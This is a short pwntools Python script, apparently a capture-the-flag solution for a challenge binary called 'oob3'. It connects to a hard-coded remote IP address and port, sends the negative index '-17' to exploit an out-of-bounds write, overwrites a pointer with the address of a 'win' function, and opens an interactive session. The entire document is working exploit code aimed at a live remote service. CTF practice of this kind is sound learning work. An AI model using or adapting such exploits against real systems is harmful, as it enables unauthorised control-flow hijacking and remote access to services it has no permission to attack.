from pwn import *

ip = "140.110.112.77"
port = 3113

context.arch = "amd64"

r = remote(ip, port)
# r = process("./oob3")

win = 0x400924

r.sendlineafter(":", "-17")
r.sendlineafter(":", p64(win))

r.interactive()
